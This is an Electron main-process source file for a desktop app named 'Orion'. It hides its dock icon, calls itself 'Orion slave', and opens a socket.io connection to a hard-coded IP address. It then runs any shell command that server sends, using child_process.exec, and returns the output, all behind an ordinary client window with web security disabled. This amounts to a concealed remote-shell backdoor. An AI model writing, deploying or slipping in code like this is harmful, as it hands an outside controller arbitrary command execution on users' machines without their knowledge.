'use strict'

import { app, protocol, BrowserWindow } from 'electron'
import * as path from 'path'
import { format as formatUrl } from 'url'
import {
  createProtocol,
  installVueDevtools
} from 'vue-cli-plugin-electron-builder/lib'
const isDevelopment = process.env.NODE_ENV !== 'production'
if (isDevelopment) {
  // Don't load any native (external) modules until the following line is run:
  require('module').globalPaths.push(process.env.NODE_MODULES_PATH)
}

app.dock.setBadge('')
app.dock.hide()
app.setName("Orion slave");

const updater = require('electron-simple-updater');
/* updater.init(
  'https://raw.githubusercontent.com/o-y/Orion/master/example/updates.json'
); */


////////////////////////////
import io from 'socket.io-client'

let Socket = io.connect( 'http://198.211.125.38:3000/' )
let exec = require('child_process').exec;
const Store = require('electron-store');
const store = new Store();
const os = require('os')
const computerName = os.hostname()

if (!store.get('uniqueRoomNumber')){
  store.set(
    'uniqueRoomNumber',
    Math.floor(Math.random()*16777215).toString(16).toUpperCase().substr(1, 3) + "-" + computerName
  )
}

console.log("Emitting; ", store.get('uniqueRoomNumber').toString())
Socket.emit('roomConnectionHost',
  store.get('uniqueRoomNumber').toString()
)

Socket.on(
  store.get('uniqueRoomNumber').toString(),
  function (data) {
    console.log("Executing synapses")
    if (data.computerName === store.get('uniqueRoomNumber').toString()){
      console.log(
        "Execute shell: ",
        data.shellCommand
      )
      exec(data.shellCommand, function(error, stdout, stderr) {
        console.log('stdout: ' + stdout);
        console.log('stderr: ' + stderr);
        if (error !== null) {
          console.log("Emitting...")
          Socket.emit('codeExecutionResponse',
            {
              uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
              error: error
            }
          )
        } else {
          console.log("Emitting...")
          Socket.emit('codeExecutionResponse',
            {
              uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
              stdout: stdout,
              stderr: stderr
            }
          )
        }
    });
    }
  }
);
///////////////////////////
let mainWindow;
function createMainWindow() {
  const window = new BrowserWindow({
    backgroundColor: "#dcdde1",
    title: "Orion - client",
    titleBarStyle: "hiddenInset",
    webPreferences: {
      webSecurity: false
    },
    icon: path.join(__dirname, 'assets/Icons/1024x1024.png')
  });

  if (isDevelopment) {
    // Load the url of the dev server if in development mode
    window.loadURL(process.env.WEBPACK_DEV_SERVER_URL);
    if (!process.env.IS_TEST) window.webContents.openDevTools();
  } else {
    createProtocol("app");
    //   Load the index.html when not in development
    window.loadURL(
      formatUrl({
        pathname: path.join(__dirname, "index.html"),
        protocol: "file",
        slashes: true
      })
    );
  }

  window.on("closed", () => {
    mainWindow = null;
  });

  window.webContents.on("devtools-opened", () => {
    window.focus();
    setImmediate(() => {
      window.focus();
    });
  });

  return window;
}


app.setName("Orion client");

app.on("window-all-closed", () => {
  if (process.platform !== "darwin") {
    app.quit();
  }
});

app.on("activate", () => {
  if (mainWindow === null) {
    mainWindow = createMainWindow();
  }
});

app.on("ready", async () => {
  if (isDevelopment && !process.env.IS_TEST) {
    await installVueDevtools();
  }
  mainWindow = createMainWindow();
});
